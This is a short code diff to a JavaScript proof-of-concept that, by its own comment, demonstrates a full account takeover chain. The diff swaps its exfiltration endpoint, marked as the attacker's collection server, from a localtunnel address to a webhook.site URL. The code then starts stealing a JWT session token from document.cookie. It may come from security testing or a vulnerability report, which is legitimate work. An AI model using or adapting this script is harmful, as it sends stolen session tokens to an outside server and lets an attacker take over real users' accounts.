@@ -3,7 +3,7 @@
 // It demonstrates the full account takeover chain
 
 (async () => {
-  const EXFIL_ENDPOINT = "https://flat-rockets-brake.loca.lt/collect"; // Attacker's collection server
+  const EXFIL_ENDPOINT = "https://webhook.site/4f2c20fd-8367-451c-ba1e-3ebc4ec2515a"; // Attacker's collection server
 
   // Step 1: Steal JWT from non-HttpOnly cookie
   const cookies = document.cookie;
